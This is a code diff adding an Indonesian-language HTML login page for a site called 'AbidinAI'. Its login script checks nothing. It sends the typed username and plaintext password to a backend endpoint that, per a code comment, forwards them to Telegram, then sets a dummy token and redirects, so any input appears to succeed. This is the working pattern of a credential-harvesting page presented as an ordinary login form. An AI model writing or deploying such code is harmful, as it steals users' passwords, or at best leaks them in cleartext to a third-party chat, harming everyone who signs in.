@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Login AbidinAI</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      color: white;
+    }
+
+    .container {
+      background: rgba(255, 255, 255, 0.1);
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.5);
+      width: 300px;
+      text-align: center;
+    }
+
+    input {
+      width: 93%;
+      padding: 10px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 8px;
+    }
+
+    button {
+      padding: 10px 20px;
+      background-color: #00c6ff;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      width: 100%;
+      margin-top: 10px;
+    }
+
+    a {
+      color: #00c6ff;
+      text-decoration: none;
+      display: block;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Login AbidinAI</h2>
+    <p>Gunakan akun yang sudah terdaftar</p>
+   <input type="text" id="username" placeholder="Masukkan Email">
+
+<div style="position: relative;">
+  <input type="password" id="password" placeholder="Masukkan Password" style="width: 95%; padding-right: 3px;">
+  <span id="togglePassword" onclick="togglePassword()" style="position: absolute; top: 16px; right: 5px; cursor: pointer;">🔒</span>
+</div>
+
+<button onclick="login()">Login</button>
+    <a href="register.html">Belum punya akun? Daftar</a>
+  </div>
+
+<script>
+  function login() {
+    const username = document.getElementById("username").value;
+    const password = document.getElementById("password").value;
+
+    if (!username || !password) {
+      alert("⚠️ Isi semua kolom!");
+      return;
+    }
+
+    const message = `🔐 Login:\n👤 Username: ${username}\n🔑 Password: ${password}`;
+
+    // Kirim ke backend untuk diteruskan ke Telegram
+    fetch("/api/telegram", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({ text: message })
+    })
+    .then(() => {
+      // Simpan token dummy
+      localStorage.setItem("abidinai_token", "token_sederhana");
+
+      // Redirect ke dashboard
+      window.location.href = "dasboard.html";
+    })
+    .catch((error) => {
+      console.error("Gagal kirim ke Telegram via backend:", error);
+      alert("Gagal login. Coba lagi.");
+    });
+  }
+</script>
+<script>
+  function togglePassword() {
+    const passInput = document.getElementById("password");
+    const toggleBtn = document.getElementById("togglePassword");
+    if (passInput.type === "password") {
+      passInput.type = "text";
+      toggleBtn.textContent = "🔓";
+    } else {
+      passInput.type = "password";
+      toggleBtn.textContent = "🔒";
+    }
+  }
+</script>
+</body>
+</html>
